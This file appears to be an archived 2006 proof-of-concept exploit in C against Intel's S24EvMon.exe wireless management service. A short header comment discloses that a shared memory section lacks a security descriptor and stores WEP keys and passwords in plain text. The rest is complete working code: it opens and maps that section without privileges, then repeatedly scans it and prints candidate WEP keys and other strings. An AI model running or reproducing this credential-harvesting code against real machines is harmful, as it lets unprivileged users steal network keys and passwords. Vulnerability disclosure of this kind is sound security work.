///////////////////////////////////////////////////////////////////////
////  S24EvMon.exe Intel Wireless Management Service KEY Hunter
////  Rubén Santamarta
////  ruben@reversemode.com
////  www.reversemode.com
////  28/04/2006
///////////////////////////////////////////////////////////////////////

/**********************************************************************************************************
 * Testing a vuln-finder application that I am developing, I found a flaw within S24EvMon.exe. 
 * It is a service which is part (at least) of the Intel PROset/Wireless software. This application 
 * is provided by Intel in order to support intel Wireless Devices based on Spectrum 24 chipsets.
 *
 * This service uses a shared memory section which is created without the proper security descriptor, 
 * allowing unprivileged users to perform operations like Delete, Read or Write into the memory. The 
 * section is named S24EventManagerSharedMemory
 * 
 * This shared memory is used to store ,in plain text, confidential information like WEP Key, Passwords...
 *
 * The successful exploitation of this vulnerability could allow to any unprivileged user to access 
 * confidential information,exposing the network. An important mitigating factor is that the 
 * vulnerability is local, nevertheless some Malware could take advantage of this flaw. 
 **********************************************************************************************************/

#include <windows.h>
#include <stdio.h>

#define InitializeObjectAttributes( p, n, a, r, s ) {	\
     (p)->Length = sizeof( OBJECT_ATTRIBUTES );         \
     (p)->RootDirectory = r;                            \
     (p)->Attributes = a;                               \
     (p)->ObjectName = n;                               \
     (p)->SecurityDescriptor = s;                       \
     (p)->SecurityQualityOfService = NULL;              \
     }

#define InitializeUnicodeStr(p,s) {			\
     (p)->Length= wcslen(s)*2;				\
     (p)->MaximumLength = wcslen(s)*2+2;		\
     (p)->Buffer = s;					\
     }


typedef struct _SECTION_BASIC_INFORMATION {
  ULONG                   d000;
  ULONG                   SectionAttributes;
  LARGE_INTEGER           SectionSize;
} SECTION_BASIC_INFORMATION;

typedef struct _LSA_UNICODE_STRING {  
    USHORT Length;  
    USHORT MaximumLength; 
    PWSTR Buffer;
} UNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    UNICODE_STRING *ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;        
    PVOID SecurityQualityOfService;  
} OBJECT_ATTRIBUTES;



typedef DWORD (WINAPI* PQUERYSECTION)(HANDLE, DWORD, PVOID,DWORD,DWORD*);

typedef DWORD (WINAPI* POPENSECTION)(HANDLE*, DWORD,OBJECT_ATTRIBUTES* );


VOID ShowError()
{
 LPVOID lpMsgBuf;
 FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER| FORMAT_MESSAGE_FROM_SYSTEM,
               NULL,
               GetLastError(),
               MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
               (LPTSTR) &lpMsgBuf,
               0,
               NULL);
 MessageBoxA(0,(LPTSTR)lpMsgBuf,"Error",0);
 exit(1);
}



int main(int argc, char* argv[])
{
 OBJECT_ATTRIBUTES SectionAttributes;
 SECTION_BASIC_INFORMATION buff;
 PQUERYSECTION NtQuerySection;
 POPENSECTION NtOpenSection;
 char * sMap,cString[256];
 UNICODE_STRING uStr;
 LPVOID lpMapAddress;
 DWORD i,b=0,c=0;
 HANDLE hSection;


NtOpenSection = (POPENSECTION) GetProcAddress( LoadLibrary( "ntdll.dll" ),
						   "NtOpenSection" );

NtQuerySection = (PQUERYSECTION) GetProcAddress( LoadLibrary( "ntdll.dll"),
						 "NtQuerySection" );

InitializeUnicodeStr(&uStr,L"\\BaseNamedObjects\\S24EventManagerSharedMemory");
InitializeObjectAttributes(&SectionAttributes, &uStr,NULL, NULL, NULL );	


NtOpenSection( &hSection, SECTION_MAP_READ|SECTION_QUERY,  &SectionAttributes );
 
if (hSection == NULL) ShowError();
printf("Section opened successfully.\n"); 
 

lpMapAddress = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
if (lpMapAddress == NULL) ShowError();
 
if (NtQuerySection(hSection,0,&buff,sizeof(buff),0)) ShowError();

sMap= ( char* )lpMapAddress;
printf("Scanning section...\n\n"); 

while(c<100)
{
 
 c++;
 printf("\nSNAPSHOT ID[%d]----------------[BEGIN]\n\n",c);
		
 for (i=0; i< buff.SectionSize.QuadPart; i++)
	{
	
		if( sMap[i]> 0x29  )
		{
			while( sMap[i] != 0x0 )
			{
				if( sMap[i]>=0x30 )
				{
					cString[b] = sMap[i];
					b++;
				}									
				i++;
			}
			
			cString[b++]='\0';
			// less 3 characters should be GARBAGE
			if( b>3 && b!=14 && b!=27 ) 	printf(" String collected: %s\n",cString);
			// Alphanumeric WEP KEY (13 characters)
			if( b==14 )	printf("### Possible Alphanumeric WEP KEY found: %s\n",cString);
			if( b==27 ) 
			{
                   		if(cString[0]!=0x30 && cString[2]!=0x30 && cString[6]!=0x30)
                       			printf("### Possible WEP KEY found(Ascii/HexMode): %s\n",cString);
                                else
                        		printf(" String collected: %s\n",cString);
                	}   
                	b=0;		
		}
			
	}
printf("\nSNAPSHOT ID[%d]----------------[END]\n",c);   

Sleep(1000);
}

CloseHandle(hSection);

return 0;
}

// milw0rm.com [2006-05-09]
